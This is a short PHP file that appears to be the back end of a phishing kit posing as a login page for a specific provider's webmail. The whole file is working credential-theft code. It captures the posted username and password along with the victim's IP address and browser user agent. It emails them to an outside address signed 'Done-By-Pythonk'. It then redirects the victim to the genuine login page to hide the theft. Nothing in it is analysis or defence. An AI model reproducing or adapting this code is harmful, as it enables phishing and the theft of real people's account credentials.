<?
$ip = getenv("REMOTE_ADDR");
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------FLAG-Log--------------\n";
$message .= "username: ".$_POST['username']."\n";
$message .= "password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "-----------Done-By-Pythonk--------\n";
$send = "yourmail@mail.com";
$subject = "ReZulTs Webmail";
$headers = "From: Netl0gs<bdtrophrecruiter@gmail.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location:  https://webmail.coastside.net/wmidentity/Account/Login?ReturnUrl=%2Fwmidentity%2Fconnect%2Fauthorize%2Fcallback%3Fresponse_mode%3Dform_post%26response_type%3Dcode%2520id_token%26redirect_uri%3Dhttps%253A%252F%252Fwebmail.coastside.net%252Flogin.php%26client_id%3Dwebmail%26nonce%3Dcc1dbbb74a684005e27fe4879e94245f%26state%3D08a7fb886a4795e433cb52f0e67b53be%26scope%3Dopenid%2520profile%2520email%2520webmail%2520openid");

?>